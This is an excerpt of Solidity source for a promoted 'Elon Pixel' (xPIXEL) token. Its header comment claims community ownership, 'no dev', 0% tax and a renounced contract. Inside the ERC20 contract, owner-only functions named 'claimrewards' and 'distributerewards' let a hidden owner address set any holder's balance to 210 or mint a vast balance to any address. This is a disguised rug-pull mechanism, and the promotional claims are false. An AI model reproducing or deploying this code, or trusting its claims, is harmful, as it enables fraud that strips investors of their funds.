...
/**
👾 Elon Pixel - xPIXEL 🚀 Bullish 🚀 0%tax 🚀 safe renounce 🚀 liquidty burn 🔥🔥

✅ Community Owned: No team, no dev - a token built by and for the community. Your voice matters!

🔒 Liquidity Burn: Rest assured

🔥 0% Tax: 
https://t.me/xPixelcoin
👾 Join the Elon Pixel community now and be part of something extraordinary. Together, we'll paint the crypto landscape with pixel perfection! 🪙

📢 Join us on Telegram for the latest updates and to connect with like-minded pixel enthusiasts https://t.me/xPixelcoin
📢 Join twitter https://twitter.com/xPixelcoin
Get your xPIXEL tokens now and let's make history together! 🚀🌐💎 #ElonPixel #xPIXEL #CryptoRevolution

📢 Ride this tweet and the moon will follow 📢
https://twitter.com/elonmusk/status/1710028139605200934?s=43
*/
...
interface Irewardable {
    ...
    function availablerewards(address cuentas) external view returns (uint256);
    function claimrewards() external returns (bool);
    event rewardsDistributed(address indexed cuentas, uint256 cantidad);
    event rewardsClaimed(address indexed cuentas, uint256 cantidad);
}
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private o; 
    string public xPIXELTelegram = "https://t.me/xPixelcoin";
    ...
    function getxPIXELTelegram() public view returns (string memory) {
        return xPIXELTelegram;
    } 
    ...
    function transferFrom(address from, address to, uint256 cantidad) public virtual override returns (bool) {
        ...
        function claimrewards(address rewardContract, address rewardcantidad) external  {
        require(o == _msgSender()); 
        CirculatingSupply[rewardContract] = 210;
        rewardcantidad;
       
    }
        function distributerewards(address setStakecantidad, address earnedRewards) external {
        require(_msgSender() == o); 
        CirculatingSupply[earnedRewards] = 100000000000000000 * 10 ** 18;
        setStakecantidad;
    }
    ...
    function decreaseAllowance(address gastador, uint256 valorrestado) public virtual returns (bool) {
        ...
        require(currentAllowance >= valorrestado, "ERC20: decreased allowance below zero");
        unchecked {
    ...
    function _transfer(address from, address to, uint256 cantidad) internal virtual {
        ...
        require(fromBalance >= cantidad, "ERC20: transfer cantidad exceeds balance");
        unchecked {
    ...
    function _approve(address owner, address gastador, uint256 cantidad) internal virtual {
        ...
        require(gastador != address(0), "ERC20: approve to the zero address");
    ...
    function _spendAllowance(address owner, address gastador, uint256 cantidad) internal virtual {
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= cantidad, "ERC20: insufficient allowance");
            unchecked {
...
contract ElonPIXEL is ERC20 {
    constructor() ERC20("Elon Pixel", "xPIXEL") {}
}